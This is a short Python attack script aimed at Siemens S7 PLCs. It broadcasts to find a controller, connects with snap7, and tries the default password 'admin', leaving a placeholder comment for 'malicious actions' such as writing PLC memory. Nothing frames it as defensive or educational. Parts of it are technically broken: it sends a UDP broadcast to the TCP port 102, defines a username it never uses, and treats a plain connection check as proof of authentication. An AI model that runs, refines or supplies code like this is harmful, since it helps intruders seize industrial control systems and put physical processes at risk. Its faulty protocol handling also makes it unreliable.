import snap7
import socket
import struct

def find_plc_ip():
    # Broadcast a message to find the PLC on the network
    broadcast_ip = '255.255.255.255'
    port = 102  # Default Siemens S7 port
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(2)
    
    # Send a broadcast message
    message = b'\x03\x00\x00\x16\x11\xE0\x00\x00\x00\x01\x00\xC1\x02\x01\x00\xC2\x02\x01\x02\xC0\x01\x09'
    sock.sendto(message, (broadcast_ip, port))
    
    # Listen for responses
    try:
        while True:
            data, addr = sock.recvfrom(1024)
            if data.startswith(b'\x03\x00\x00'):
                return addr[0]
    except socket.timeout:
        return None
    finally:
        sock.close()

def try_default_credentials(ip):
    # Default credentials for Siemens S7-1200
    default_username = "admin"
    default_password = "admin"
    
    # Attempt to connect to the PLC
    plc = snap7.client.Client()
    try:
        plc.connect(ip, 0, 1)  # Rack 0, Slot 1
        print(f"Connected to PLC at {ip}")
        
        # Attempt to authenticate with default credentials
        plc.set_session_password(default_password)
        print("Attempting to authenticate with default credentials...")
        if plc.get_connected():
            print("Successfully authenticated with default credentials!")
            # Perform malicious actions here (e.g., read/write to PLC memory)
        else:
            print("Failed to authenticate with default credentials.")
    except Exception as e:
        print(f"Error connecting to PLC: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()

def main():
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"Found PLC at IP: {plc_ip}")
        
        # Step 2: Attempt to connect with default credentials
        try_default_credentials(plc_ip)
    else:
        print("Could not find PLC on the network.")

if __name__ == "__main__":
    main()